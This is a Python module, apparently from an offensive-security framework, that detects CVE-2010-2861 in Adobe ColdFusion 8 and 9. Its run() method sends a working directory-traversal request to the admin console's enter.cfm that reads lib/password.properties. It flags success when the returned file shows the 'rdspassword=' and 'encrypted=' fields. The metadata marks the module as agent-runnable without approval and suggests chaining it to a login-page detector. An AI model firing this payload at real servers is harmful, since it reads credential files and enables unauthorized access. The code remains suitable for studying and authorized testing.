#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adobe ColdFusion 8.0/8.0.1/9.0/9.0.1 LFI Detection',
        'description': 'Multiple directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier allow remote attackers to read arbitrary files via the locale parameter to (1) CFIDE/administrator/settings/mappings.cfm, (2) logging/settings.cfm, (3) datasources/index.cfm, (4) j2eepackaging/editarchive.cfm, and (5) enter.cfm in CFIDE/administrator/.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'adobe', 'kev', 'vulhub', 'coldfusion', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/tree/master/coldfusion/CVE-2010-2861',
            'http://www.adobe.com/support/security/bulletins/apsb10-18.html',
            'http://securityreason.com/securityalert/8148',
            'http://securityreason.com/securityalert/8137',
            'http://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/',
        ],
        'cve': 'CVE-2010-2861',
    }

    def run(self):
        r = self.http_request(method="GET", path='/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('rdspassword=', 'encrypted=',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Adobe ColdFusion 8.0/8.0.1/9.0/9.0.1 LFI detected",
                path='/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en',
            )
            return True
        return False

